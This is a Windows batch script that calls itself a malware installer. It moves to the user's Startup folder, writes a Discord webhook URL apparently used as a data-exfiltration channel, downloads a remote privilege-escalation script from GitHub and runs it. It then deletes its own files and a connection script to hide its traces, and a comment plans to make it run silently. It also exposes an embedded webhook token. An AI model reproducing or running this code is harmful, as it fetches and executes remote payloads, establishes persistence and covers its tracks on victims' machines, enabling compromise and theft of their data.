@rem Installer for the malware
@rem TODO: Make the CMD prompt run silently

@echo off
set "CurrentDirectory=%CD%"
set "StartupDirectory=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

@REM Change directory to startup
cd /d "%StartupDirectory%"

@REM Change to your Discord Webhook URL
echo https://discord.com/api/webhooks/1167014901038993510/j2oWTYLE3mhwIjTAvOOCh3CauMLSWlzSQCtBoL5UEzTfGasfXSdO4TCtBHSsRbEb6YWD > DiscordWebhookURL.icu

@REM Download required files

powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ReylanTeo/IControlU/main/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
powershell Start-Process -FilePath "PrivilegeEscalation.cmd" -NoNewWindow -Wait

@REM Delete the Discord Webhook file
del "DiscordWebhookURL.icu"

@REM Delete the PrivilegeEscalation file
del "PrivilegeEscalation.cmd"

@REM Delete the EstablishConnection file
del "EstablishConnection.ps1"

@REM Delete the original installer
cd /d %CurrentDirectory%
del "Installer.cmd"